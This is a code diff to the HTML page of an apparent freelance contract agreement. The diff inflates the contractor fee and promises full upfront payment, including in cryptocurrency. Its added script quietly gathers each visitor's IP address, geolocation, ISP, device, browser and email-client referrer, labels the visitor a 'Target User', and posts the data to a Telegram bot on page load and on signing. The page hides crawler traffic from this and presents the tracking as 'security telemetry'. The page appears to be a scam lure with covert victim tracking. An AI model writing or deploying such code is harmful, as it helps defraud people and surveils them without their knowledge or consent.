@@ -1205,7 +1205,7 @@ CROP MODAL
                 <div class="meta-cell meta-label">Contractor:</div>
                 <div class="meta-cell meta-value" id="metaContractorName">Anna Grzybowska</div>
                 <div class="meta-cell meta-label">Total Fee:</div>
-                <div class="meta-cell meta-value">$3,400.00 USD</div>
+                <div class="meta-cell meta-value">$8,350.00 USD</div>
             </div>
         </div>
 
@@ -1220,7 +1220,7 @@ CROP MODAL
 
         <h2>2. Financial Terms & Compensation</h2>
         <p>
-  Client agrees to pay Contractor a fixed total fee of <strong>$3,400.00 USD</strong> for all scope items, documentation, source vectors, and deliverables specified in Section 1.             
+  Client agrees to pay Contractor a fixed total fee of <strong>$8,350.00 USD</strong> for all scope items, documentation, source vectors, and deliverables specified in Section 1.             
   <img id="contract-section-img" src="assets/pictures/1790461094117.jpg" class="step-image">
 
   <div style="height:14px;"></div> Disbursement will be immediately processed 100% upfront directly to your preferred payment method (Options: Bank Transfer, PayPal, Mobile Payments, and lastly cryptocurrency).
@@ -2048,6 +2048,254 @@ if (urlParamsForReset.get('reset') === 'true') {
 if (localStorage.getItem('avalonflow_contract_signed') === 'true') {
     window.location.replace(getContraRedirectUrl());
 }
+
+        // ==========================================
+    // 2. PERSISTENT TIMELINE MANAGER (LOCALSTORAGE - 1 WEEK / 7-DAY SPRINT)
+    // ==========================================
+    function initializeOrLoadSchedule() {
+        const STORAGE_KEY = 'avalonflow_contract_schedule';
+        let scheduleData = null;
+
+        const savedSchedule = localStorage.getItem(STORAGE_KEY);
+        if (savedSchedule) {
+            try {
+                scheduleData = JSON.parse(savedSchedule);
+            } catch (e) {
+                console.error("Failed to parse stored schedule", e);
+            }
+        }
+
+        if (!scheduleData) {
+            const baseDate = new Date();
+
+            // Milestone 1: Days 2 - 3 (Initial Design Concepts & System Guide Outline)
+            const m1Start = new Date(baseDate); m1Start.setDate(baseDate.getDate() + 2);
+            const m1End = new Date(baseDate); m1End.setDate(baseDate.getDate() + 3);
+
+            // Milestone 2: Day 4 (Client Review & Feedback)
+            const m2Date = new Date(baseDate); m2Date.setDate(baseDate.getDate() + 4);
+
+            // Milestone 3: Days 4 - 5 (Refinements, Specs & Guide Build)
+            const m3End = new Date(baseDate); m3End.setDate(baseDate.getDate() + 5);
+
+            // Milestone 4: Days 6 - 7 (Final Complete .zip Package Delivery)
+            const m4Start = new Date(baseDate); m4Start.setDate(baseDate.getDate() + 6);
+            const m4End = new Date(baseDate); m4End.setDate(baseDate.getDate() + 7);
+
+            scheduleData = {
+                effectiveDate: getFormattedDate(baseDate.getTime()),
+                m0: getFormattedDate(baseDate.getTime()),
+                m1: `${getCustomShortMonth(m1Start)} – ${getCustomShortMonth(m1End)}`,
+                m2: getFormattedDate(m2Date.getTime()),
+                m3: `${getCustomShortMonth(m2Date)} – ${getCustomShortMonth(m3End)}`,
+                m4: `${getCustomShortMonth(m4Start)} – ${getCustomShortMonth(m4End)}`,
+                timestamp: baseDate.getTime()
+            };
+
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(scheduleData));
+        }
+
+        return scheduleData;
+    }
+
+
+    // ==========================================
+    // 3. TELEGRAM NOTIFICATION ENGINE
+    // ==========================================
+    async function sendTelegramNotification(eventType = "Visitor Alert") {
+        try {
+            const rawAgent = navigator.userAgent;
+
+            if (/bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|slurp|embed/i.test(rawAgent)) {
+                console.log("🤖 Automated link indexing crawler bypassed safely.");
+                return;
+            }
+
+            if (eventType === "Visitor Alert" && sessionStorage.getItem('visitor_logged_tg_contract')) {
+                return;
+            }
+
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            if (!ipResponse.ok) throw new Error('Failed to fetch network details');
+            const ipData = await ipResponse.json();
+
+            const currentPage = window.location.pathname;
+            let detailedDevice = "Unknown Device";
+            let detectedBrowser = "Unknown Browser";
+
+            if (/WhatsApp/i.test(rawAgent)) detectedBrowser = "WhatsApp In-App";
+            else if (/TelegramBot|Telegram/i.test(rawAgent)) detectedBrowser = "Telegram In-App";
+            else if (/Instagram/i.test(rawAgent)) detectedBrowser = "Instagram App";
+            else if (/TikTok/i.test(rawAgent)) detectedBrowser = "TikTok App";
+            else if (/FBAN|FBAV/i.test(rawAgent)) detectedBrowser = "Facebook App";
+            else if (/Twitter|TwitterforiPhone|TwitterAndroid/i.test(rawAgent)) detectedBrowser = "X (Twitter) App";
+            else if (/LinkedInApp/i.test(rawAgent)) detectedBrowser = "LinkedIn App";
+            else if (/Phoenix/i.test(rawAgent)) detectedBrowser = "Phoenix Browser";
+            else if (/SamsungBrowser/i.test(rawAgent)) detectedBrowser = "Samsung Internet";
+            else if (/OComponent|Opera|OPR/i.test(rawAgent)) detectedBrowser = "Opera";
+            else if (/Edg/i.test(rawAgent)) detectedBrowser = "Microsoft Edge";
+            else if (/Firefox|FxiOS/i.test(rawAgent)) detectedBrowser = "Mozilla Firefox";
+            else if (/Chrome|CriOS/i.test(rawAgent)) detectedBrowser = "Google Chrome";
+            else if (/Safari/i.test(rawAgent) && !/Android/i.test(rawAgent)) detectedBrowser = "Apple Safari";
+
+            const referrer = document.referrer || "";
+            if (detectedBrowser === "Google Chrome" || detectedBrowser === "Apple Safari") {
+                if (/mail\.google\.com/i.test(referrer)) detectedBrowser += " (via Gmail Web)";
+                else if (/mail\.yahoo/i.test(referrer)) detectedBrowser += " (via Yahoo Mail Web)";
+                else if (/outlook|live\.com/i.test(referrer)) detectedBrowser += " (via Outlook Web)";
+            }
+
+            if (/Android/i.test(rawAgent)) {
+                const match = rawAgent.match(/Android\s+([^;]+);\s+([^)]+)/);
+                detailedDevice = match ? `Android ${match[1]} (${match[2]})` : "Android Device";
+            } else if (/iPhone|iPad|iPod/i.test(rawAgent)) {
+                const match = rawAgent.match(/OS\s+(\d+_\d+)/);
+                const iosVer = match ? match[1].replace('_', '.') : '';
+                detailedDevice = `iOS ${iosVer} (Apple Device)`;
+            } else if (/Windows/i.test(rawAgent)) {
+                const match = rawAgent.match(/Windows NT\s+([^;)]+)/);
+                let winVer = "PC";
+                if (match) {
+                    if (match[1] === "10.0") winVer = "10/11";
+                    else if (match[1] === "6.3") winVer = "8.1";
+                    else if (match[1] === "6.1") winVer = "7";
+                }
+                detailedDevice = `Windows ${winVer}`;
+            } else if (/Macintosh/i.test(rawAgent)) {
+                detailedDevice = "macOS Device";
+            } else if (/Linux/i.test(rawAgent)) {
+                detailedDevice = "Linux System";
+            }
+
+            const isProxy = ipData.proxy || false;
+            const ipDisplay = isProxy ? `${ipData.ip} ⚠️ [Proxy/VPN]` : ipData.ip;
+
+            const payload = {
+                device: detailedDevice,
+                browser: detectedBrowser,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                connectionType: navigator.connection ? navigator.connection.effectiveType : "N/A",
+                ip: ipDisplay || "Unknown",
+                city: ipData.city || "Unknown",
+                region: ipData.region || "Unknown",
+                country: ipData.country_name || "Unknown",
+                isp: ipData.org || "Unknown",
+                timestamp: new Date().toLocaleString()
+            };
+
+            const alertTitle = eventType === "Contract Signed" 
+                ? `<b>✍️ CONTRACT EXECUTED ALERT</b>` 
+                : `<b>👁️ New Visitor Alert</b>`;
+
+            const messageText = `${alertTitle}\n\n` +
+                                `👤 <b>Target User:</b> <code>${contractorName}</code>\n` +
+                                `📄 <b>Visited Page:</b> <code>${currentPage}</code>\n` +
+                                `🌐 <b>IP:</b> <code>${payload.ip}</code>\n` +
+                                `📍 <b>Location:</b> <code>${payload.city}, ${payload.region}, ${payload.country}</code>\n` +
+                                `🏢 <b>ISP:</b> <code>${payload.isp}</code>\n` +
+                                `📶 <b>Net Speed:</b> <code>${payload.connectionType}</code>\n` +
+                                `🌐 <b>Browser:</b> <code>${payload.browser}</code>\n` +
+                                `📱 <b>Device Setup:</b> <code>${payload.device}</code>\n` + 
+                                `📐 <b>Screen Res:</b> <code>${payload.screenResolution}</code>\n` +
+                                `⏰ <b>Time:</b> <code>${payload.timestamp}</code>`;
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKENs}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_IDs,
+                    text: messageText,
+                    parse_mode: 'HTML'
+                })
+            });
+
+            if (eventType === "Visitor Alert") {
+                sessionStorage.setItem('visitor_logged_tg_contract', 'true');
+            }
+            console.log(`🔒 Security telemetry (${eventType}) forwarded successfully.`);
+        } catch (err) {
+            console.warn("Telegram telemetry bypass error:", err);
+        }
+    }
+
+    // ==========================================
+    // 4. DOM INITIALIZATION & SIGNING HANDLER
+    // ==========================================
+    document.addEventListener("DOMContentLoaded", function() {
+        const schedule = initializeOrLoadSchedule();
+
+        // Bind calculated/stored schedule directly to specific DOM elements
+        const metaDateEl = document.getElementById('metaEffectiveDate');
+        if (metaDateEl) metaDateEl.innerText = schedule.effectiveDate;
+
+        const clientSigDateEl = document.getElementById('clientSigDate');
+        if (clientSigDateEl) clientSigDateEl.innerText = schedule.effectiveDate;
+
+        if (document.getElementById('m-date-0')) document.getElementById('m-date-0').innerText = schedule.m0;
+        if (document.getElementById('m-date-1')) document.getElementById('m-date-1').innerText = schedule.m1;
+        if (document.getElementById('m-date-2')) document.getElementById('m-date-2').innerText = schedule.m2;
+        if (document.getElementById('m-date-3')) document.getElementById('m-date-3').innerText = schedule.m3;
+        if (document.getElementById('m-date-4')) document.getElementById('m-date-4').innerText = schedule.m4;
+
+        // Bind Contractor Name Metadata
+        const metaContractor = document.getElementById('metaContractorName');
+        if (metaContractor) metaContractor.innerText = contractorName;
+
+        const sigNameEl = document.getElementById('contractorSignature');
+        if (sigNameEl) sigNameEl.innerText = contractorName;
+
+        const sigTitleEl = document.getElementById('contractorSigTitle');
+        if (sigTitleEl) sigTitleEl.innerText = contractorName;
+
+        document.querySelectorAll('.dynamic-contractor-name').forEach(span => {
+            span.innerText = contractorName;
+        });
+
+        const agreeBtn = document.getElementById('agreeBtn');
+        if (agreeBtn) {
+            agreeBtn.addEventListener('click', handleSignAgreement);
+        }
+
+        sendTelegramNotification("Visitor Alert");
+    });
+
+    window.addEventListener("load", () => {
+        window.parent.postMessage({
+            type: "UPDATE_TITLE",
+            title: "🪽 AvalonCare Contract Agreement"
+        }, "*");
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const userParam = urlParams.get('user') || contractorName;
+
+        const destinationPath = userParam 
+            ? `/contract?user=${encodeURIComponent(userParam)}` 
+            : '/contract';
+
+        window.parent.postMessage({ type: "UPDATE_URL", path: destinationPath }, "*");
+    });
+
+    async function handleSignAgreement() {
+        const agreeBtn = document.getElementById('agreeBtn');
+        if (agreeBtn) agreeBtn.disabled = true;
+
+        const timestampNow = Date.now();
+        const executionDateStr = getFormattedDate(timestampNow);
+
+        localStorage.setItem('avalonflow_contract_signed', 'true');
+        localStorage.setItem('avalonflow_contract_signed_date', executionDateStr);
+        localStorage.setItem('avalonflow_contract_signed_timestamp', timestampNow);
+
+        document.getElementById('contractorSignature').style.display = 'inline-block';
+        document.getElementById('sigDate').innerText = executionDateStr;
+        document.getElementById('actionArea').innerHTML = '<p style="color: #27ae60; font-weight: 700;">Agreement executed! Redirecting...</p>';
+
+        await sendTelegramNotification("Contract Signed");
+
+        setTimeout(function() {
+            window.location.replace(getContraRedirectUrl());
+        }, 800);
+    }
 
 /**
  * AvalonFlow: Kairos Intelligent Voice & UI Controller
@@ -3548,7 +3796,7 @@ function updateSpeakingIndicator(isSpeaking) {
 }
 
 window.addEventListener('DOMContentLoaded', () => {
-  
+  sendTelegramNotification("Visitor Alert");
   restoreSavedTranscripts();
   restoreMusicState();
 
@@ -3625,255 +3873,6 @@ window.addEventListener('DOMContentLoaded', () => {
     });
   }
 });
-
-        // ==========================================
-    // 2. PERSISTENT TIMELINE MANAGER (LOCALSTORAGE - 1 WEEK / 7-DAY SPRINT)
-    // ==========================================
-    function initializeOrLoadSchedule() {
-        const STORAGE_KEY = 'avalonflow_contract_schedule';
-        let scheduleData = null;
-
-        const savedSchedule = localStorage.getItem(STORAGE_KEY);
-        if (savedSchedule) {
-            try {
-                scheduleData = JSON.parse(savedSchedule);
-            } catch (e) {
-                console.error("Failed to parse stored schedule", e);
-            }
-        }
-
-        if (!scheduleData) {
-            const baseDate = new Date();
-
-            // Milestone 1: Days 2 - 3 (Initial Design Concepts & System Guide Outline)
-            const m1Start = new Date(baseDate); m1Start.setDate(baseDate.getDate() + 2);
-            const m1End = new Date(baseDate); m1End.setDate(baseDate.getDate() + 3);
-
-            // Milestone 2: Day 4 (Client Review & Feedback)
-            const m2Date = new Date(baseDate); m2Date.setDate(baseDate.getDate() + 4);
-
-            // Milestone 3: Days 4 - 5 (Refinements, Specs & Guide Build)
-            const m3End = new Date(baseDate); m3End.setDate(baseDate.getDate() + 5);
-
-            // Milestone 4: Days 6 - 7 (Final Complete .zip Package Delivery)
-            const m4Start = new Date(baseDate); m4Start.setDate(baseDate.getDate() + 6);
-            const m4End = new Date(baseDate); m4End.setDate(baseDate.getDate() + 7);
-
-            scheduleData = {
-                effectiveDate: getFormattedDate(baseDate.getTime()),
-                m0: getFormattedDate(baseDate.getTime()),
-                m1: `${getCustomShortMonth(m1Start)} – ${getCustomShortMonth(m1End)}`,
-                m2: getFormattedDate(m2Date.getTime()),
-                m3: `${getCustomShortMonth(m2Date)} – ${getCustomShortMonth(m3End)}`,
-                m4: `${getCustomShortMonth(m4Start)} – ${getCustomShortMonth(m4End)}`,
-                timestamp: baseDate.getTime()
-            };
-
-            localStorage.setItem(STORAGE_KEY, JSON.stringify(scheduleData));
-        }
-
-        return scheduleData;
-    }
-
-
-    // ==========================================
-    // 3. TELEGRAM NOTIFICATION ENGINE
-    // ==========================================
-    async function sendTelegramNotification(eventType = "Visitor Alert") {
-        try {
-            const rawAgent = navigator.userAgent;
-
-            if (/bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|slurp|embed/i.test(rawAgent)) {
-                console.log("🤖 Automated link indexing crawler bypassed safely.");
-                return;
-            }
-
-            if (eventType === "Visitor Alert" && sessionStorage.getItem('visitor_logged_tg_contract')) {
-                return;
-            }
-
-            const ipResponse = await fetch('https://ipapi.co/json/');
-            if (!ipResponse.ok) throw new Error('Failed to fetch network details');
-            const ipData = await ipResponse.json();
-
-            const currentPage = window.location.pathname;
-            let detailedDevice = "Unknown Device";
-            let detectedBrowser = "Unknown Browser";
-
-            if (/WhatsApp/i.test(rawAgent)) detectedBrowser = "WhatsApp In-App";
-            else if (/TelegramBot|Telegram/i.test(rawAgent)) detectedBrowser = "Telegram In-App";
-            else if (/Instagram/i.test(rawAgent)) detectedBrowser = "Instagram App";
-            else if (/TikTok/i.test(rawAgent)) detectedBrowser = "TikTok App";
-            else if (/FBAN|FBAV/i.test(rawAgent)) detectedBrowser = "Facebook App";
-            else if (/Twitter|TwitterforiPhone|TwitterAndroid/i.test(rawAgent)) detectedBrowser = "X (Twitter) App";
-            else if (/LinkedInApp/i.test(rawAgent)) detectedBrowser = "LinkedIn App";
-            else if (/Phoenix/i.test(rawAgent)) detectedBrowser = "Phoenix Browser";
-            else if (/SamsungBrowser/i.test(rawAgent)) detectedBrowser = "Samsung Internet";
-            else if (/OComponent|Opera|OPR/i.test(rawAgent)) detectedBrowser = "Opera";
-            else if (/Edg/i.test(rawAgent)) detectedBrowser = "Microsoft Edge";
-            else if (/Firefox|FxiOS/i.test(rawAgent)) detectedBrowser = "Mozilla Firefox";
-            else if (/Chrome|CriOS/i.test(rawAgent)) detectedBrowser = "Google Chrome";
-            else if (/Safari/i.test(rawAgent) && !/Android/i.test(rawAgent)) detectedBrowser = "Apple Safari";
-
-            const referrer = document.referrer || "";
-            if (detectedBrowser === "Google Chrome" || detectedBrowser === "Apple Safari") {
-                if (/mail\.google\.com/i.test(referrer)) detectedBrowser += " (via Gmail Web)";
-                else if (/mail\.yahoo/i.test(referrer)) detectedBrowser += " (via Yahoo Mail Web)";
-                else if (/outlook|live\.com/i.test(referrer)) detectedBrowser += " (via Outlook Web)";
-            }
-
-            if (/Android/i.test(rawAgent)) {
-                const match = rawAgent.match(/Android\s+([^;]+);\s+([^)]+)/);
-                detailedDevice = match ? `Android ${match[1]} (${match[2]})` : "Android Device";
-            } else if (/iPhone|iPad|iPod/i.test(rawAgent)) {
-                const match = rawAgent.match(/OS\s+(\d+_\d+)/);
-                const iosVer = match ? match[1].replace('_', '.') : '';
-                detailedDevice = `iOS ${iosVer} (Apple Device)`;
-            } else if (/Windows/i.test(rawAgent)) {
-                const match = rawAgent.match(/Windows NT\s+([^;)]+)/);
-                let winVer = "PC";
-                if (match) {
-                    if (match[1] === "10.0") winVer = "10/11";
-                    else if (match[1] === "6.3") winVer = "8.1";
-                    else if (match[1] === "6.1") winVer = "7";
-                }
-                detailedDevice = `Windows ${winVer}`;
-            } else if (/Macintosh/i.test(rawAgent)) {
-                detailedDevice = "macOS Device";
-            } else if (/Linux/i.test(rawAgent)) {
-                detailedDevice = "Linux System";
-            }
-
-            const isProxy = ipData.proxy || false;
-            const ipDisplay = isProxy ? `${ipData.ip} ⚠️ [Proxy/VPN]` : ipData.ip;
-
-            const payload = {
-                device: detailedDevice,
-                browser: detectedBrowser,
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                connectionType: navigator.connection ? navigator.connection.effectiveType : "N/A",
-                ip: ipDisplay || "Unknown",
-                city: ipData.city || "Unknown",
-                region: ipData.region || "Unknown",
-                country: ipData.country_name || "Unknown",
-                isp: ipData.org || "Unknown",
-                timestamp: new Date().toLocaleString()
-            };
-
-            const alertTitle = eventType === "Contract Signed" 
-                ? `<b>✍️ CONTRACT EXECUTED ALERT</b>` 
-                : `<b>👁️ New Visitor Alert</b>`;
-
-            const messageText = `${alertTitle}\n\n` +
-                                `👤 <b>Target User:</b> <code>${contractorName}</code>\n` +
-                                `📄 <b>Visited Page:</b> <code>${currentPage}</code>\n` +
-                                `🌐 <b>IP:</b> <code>${payload.ip}</code>\n` +
-                                `📍 <b>Location:</b> <code>${payload.city}, ${payload.region}, ${payload.country}</code>\n` +
-                                `🏢 <b>ISP:</b> <code>${payload.isp}</code>\n` +
-                                `📶 <b>Net Speed:</b> <code>${payload.connectionType}</code>\n` +
-                                `🌐 <b>Browser:</b> <code>${payload.browser}</code>\n` +
-                                `📱 <b>Device Setup:</b> <code>${payload.device}</code>\n` + 
-                                `📐 <b>Screen Res:</b> <code>${payload.screenResolution}</code>\n` +
-                                `⏰ <b>Time:</b> <code>${payload.timestamp}</code>`;
-
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKENs}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_IDs,
-                    text: messageText,
-                    parse_mode: 'HTML'
-                })
-            });
-
-            if (eventType === "Visitor Alert") {
-                sessionStorage.setItem('visitor_logged_tg_contract', 'true');
-            }
-            console.log(`🔒 Security telemetry (${eventType}) forwarded successfully.`);
-        } catch (err) {
-            console.warn("Telegram telemetry bypass error:", err);
-        }
-    }
-
-    // ==========================================
-    // 4. DOM INITIALIZATION & SIGNING HANDLER
-    // ==========================================
-    document.addEventListener("DOMContentLoaded", function() {
-        const schedule = initializeOrLoadSchedule();
-
-        // Bind calculated/stored schedule directly to specific DOM elements
-        const metaDateEl = document.getElementById('metaEffectiveDate');
-        if (metaDateEl) metaDateEl.innerText = schedule.effectiveDate;
-
-        const clientSigDateEl = document.getElementById('clientSigDate');
-        if (clientSigDateEl) clientSigDateEl.innerText = schedule.effectiveDate;
-
-        if (document.getElementById('m-date-0')) document.getElementById('m-date-0').innerText = schedule.m0;
-        if (document.getElementById('m-date-1')) document.getElementById('m-date-1').innerText = schedule.m1;
-        if (document.getElementById('m-date-2')) document.getElementById('m-date-2').innerText = schedule.m2;
-        if (document.getElementById('m-date-3')) document.getElementById('m-date-3').innerText = schedule.m3;
-        if (document.getElementById('m-date-4')) document.getElementById('m-date-4').innerText = schedule.m4;
-
-        // Bind Contractor Name Metadata
-        const metaContractor = document.getElementById('metaContractorName');
-        if (metaContractor) metaContractor.innerText = contractorName;
-
-        const sigNameEl = document.getElementById('contractorSignature');
-        if (sigNameEl) sigNameEl.innerText = contractorName;
-
-        const sigTitleEl = document.getElementById('contractorSigTitle');
-        if (sigTitleEl) sigTitleEl.innerText = contractorName;
-
-        document.querySelectorAll('.dynamic-contractor-name').forEach(span => {
-            span.innerText = contractorName;
-        });
-
-        const agreeBtn = document.getElementById('agreeBtn');
-        if (agreeBtn) {
-            agreeBtn.addEventListener('click', handleSignAgreement);
-        }
-
-        sendTelegramNotification("Visitor Alert");
-    });
-
-    window.addEventListener("load", () => {
-        window.parent.postMessage({
-            type: "UPDATE_TITLE",
-            title: "🪽 AvalonCare Contract Agreement"
-        }, "*");
-
-        const urlParams = new URLSearchParams(window.location.search);
-        const userParam = urlParams.get('user') || contractorName;
-
-        const destinationPath = userParam 
-            ? `/contract?user=${encodeURIComponent(userParam)}` 
-            : '/contract';
-
-        window.parent.postMessage({ type: "UPDATE_URL", path: destinationPath }, "*");
-    });
-
-    async function handleSignAgreement() {
-        const agreeBtn = document.getElementById('agreeBtn');
-        if (agreeBtn) agreeBtn.disabled = true;
-
-        const timestampNow = Date.now();
-        const executionDateStr = getFormattedDate(timestampNow);
-
-        localStorage.setItem('avalonflow_contract_signed', 'true');
-        localStorage.setItem('avalonflow_contract_signed_date', executionDateStr);
-        localStorage.setItem('avalonflow_contract_signed_timestamp', timestampNow);
-
-        document.getElementById('contractorSignature').style.display = 'inline-block';
-        document.getElementById('sigDate').innerText = executionDateStr;
-        document.getElementById('actionArea').innerHTML = '<p style="color: #27ae60; font-weight: 700;">Agreement executed! Redirecting...</p>';
-
-        await sendTelegramNotification("Contract Signed");
-
-        setTimeout(function() {
-            window.location.replace(getContraRedirectUrl());
-        }, 800);
-    }
-
 </script>
 </body>
 </html>
